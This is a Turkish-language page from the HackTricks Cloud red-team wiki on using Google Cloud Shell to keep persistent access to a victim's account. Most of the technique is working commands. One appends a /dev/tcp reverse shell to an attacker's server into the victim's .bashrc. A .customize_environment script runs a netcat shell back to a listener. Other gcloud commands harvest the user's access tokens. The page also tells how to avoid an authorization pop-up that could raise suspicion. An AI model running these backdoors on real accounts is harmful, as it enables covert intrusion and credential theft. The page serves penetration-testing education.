# GCP - Cloud Shell Sürekliliği

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Cloud Shell

Daha fazla bilgi için kontrol edin:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Sürekli Arka Kapı

[**Google Cloud Shell**](https://cloud.google.com/shell/) tarayıcınızdan bulut kaynaklarınıza komut satırı erişimi sağlar ve bununla ilgili herhangi bir maliyet yoktur.

Google'ın Cloud Shell'ine **web konsolundan** veya **`gcloud cloud-shell ssh`** komutunu çalıştırarak erişebilirsiniz.

Bu konsolun saldırganlar için bazı ilginç yetenekleri vardır:

1. **Google Cloud'a erişimi olan herhangi bir Google kullanıcısı**, tamamen kimlik doğrulamalı bir Cloud Shell örneğine erişim sağlar (Hizmet Hesapları, organizasyonun Sahipleri olsa bile erişebilir).
2. Bu örnek, **hiçbir etkinlik gerçekleşmezse en az 120 gün boyunca** ana dizinini koruyacaktır.
3. Bu örneğin etkinliğini **izleme yeteneği yoktur**.

Bu, temelde bir saldırganın kullanıcının ana dizinine bir arka kapı koyabileceği ve kullanıcı her 120 günde bir GC Shell'e bağlandığı sürece, arka kapının hayatta kalacağı ve saldırganın her çalıştırıldığında bir shell alacağı anlamına gelir, sadece şunu yaparak: 

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Ev dizininde, kullanıcı **cloud shell**'e eriştiğinde **her seferinde** **çalıştırılacak** olan **`.customize_environment`** adında başka bir dosya vardır (önceki teknikte olduğu gibi). Kullanıcı "sık sık" cloud shell'i kullandığı sürece kalıcılığı sağlamak için önceki arka kapıyı veya aşağıdaki gibi birini ekleyin:
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
**Kimlik doğrulama gerektiren bir eylem gerçekleştirildiğinde**, kullanıcının tarayıcısında bir onay penceresi açıldığını belirtmek önemlidir. Bu pencerenin kabul edilmesi, komutun çalışabilmesi için gereklidir. Beklenmedik bir pop-up görünürse, bu şüphe uyandırabilir ve kullanılan kalıcılık yöntemini tehlikeye atabilir.
{% endhint %}

Bu, bulut shell'den (saldırgan olarak) `gcloud projects list` komutunu çalıştırdığınızda tarayıcıda görünen pop-up'tır:

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Ancak, kullanıcı bulut shell'i aktif olarak kullandıysa, pop-up görünmeyecek ve **kullanıcının token'larını toplamak için**:
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSH bağlantısının nasıl kurulduğu

Temelde, bu 3 API çağrısı kullanılır:

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (yerel olarak oluşturduğunuz genel anahtarınızı eklemenizi sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (örneği başlatmanızı sağlar)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (google cloud shell'in ip'sini bildirir)

Ancak daha fazla bilgi bulabilirsiniz [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## Referanslar

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
